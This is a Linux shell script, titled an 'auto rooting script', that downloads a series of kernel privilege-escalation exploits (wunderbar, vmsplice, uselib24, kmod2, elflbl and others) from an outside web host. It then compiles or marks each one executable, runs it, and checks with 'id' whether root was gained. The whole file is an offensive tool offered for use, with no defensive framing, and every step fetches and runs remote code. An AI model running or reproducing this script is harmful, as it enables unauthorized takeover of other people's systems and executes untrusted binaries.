#!/bin/sh
# Auto Rooting Script ver 1.0
#   _____          __           __________               __
#  /  _  \  __ ___/  |_  ____   \______   \ ____   _____/  |_
# /  /_\  \|  |  \   __\/  _ \   |       _//  _ \ /  _ \   __\
#/    |    \  |  /|  | (  <_> )  |    |   (  <_> |  <_> )  |
#\____|__  /____/ |__|  \____/   |____|_  /\____/ \____/|__|
#        \/                             \/
#To start script "./aroot.sh"
#http://voixsec.blogspot.com
#



uname -a;
mkdir expl;
cd expl;
echo "Checking if already root...";
id;

echo "Trying wunderbar...";
wget http://conficker.web.id/auto//sock-sendpage-local-root-exploit.tar.gz;
tar -zxvf sock-sendpage-local-root-exploit.tar.gz;
cd sock-sendpage-local-root-exploit;
./wunderbar_emporium.sh;
id;

echo "Trying gayros...";
wget http://conficker.web.id/auto//local-root-exploit-gayros.c;
gcc -o gayros local-root-exploit-gayros.c;
./gayros;
id;

echo "Trying gayros...";
wget http://conficker.web.id/auto//2.6.18-164.11.1.el5;
chmod 777 2.6.18-164.11.1.el5;
./2.6.18-164.11.1.el5;
id;

echo "Trying vmsplice...";
wget http://conficker.web.id/auto//vmsplice-local-root-exploit.c;
gcc -o vmsplice-local-root-exploit vmsplice-local-root-exploit.c;
./vmsplice-local-root-exploit;
id;

echo "Trying 2.6.x localroot...";
wget http://conficker.web.id/auto/x2;
./x2;
id;

echo "Trying 2.6.x localroot...";
wget http://conficker.web.id/auto/x;
chmod 777 x;
./x;
id;

echo "Trying 2.6.x [ uselib24 ] localroot...";
wget http://conficker.web.id/auto/uselib24;
chmod 777 uselib24;
./uselib24;
id;

echo "Trying 2.6.x [ root2 ] localroot...";
wget http://conficker.web.id/auto/root2;
chmod 777 root2;
./root2;
id;

echo "Trying 2.6.x [ kmod2 ] localroot...";
wget http://conficker.web.id/auto/kmod2;
chmod 777 kmod2;
./kmod2;
id;

echo "Trying 2.6.x localroot...";
wget http://conficker.web.id/auto/exp.sh;
chmod 755 exp.sh;
./exp.sh;
id;

echo "Trying 2.6.x [ elflbl ] localroot...";
wget http://conficker.web.id/auto/elflbl;
chmod 777 elflbl;
./elflbl;
id;

echo "Trying 2.6.x [ cw7.3 ] localroot...";
wget http://conficker.web.id/auto/cw7.3;
chmod 777 cw7.3;
./cw7.3;
id;

echo "Done with exploits. Failed to achieve root :<";
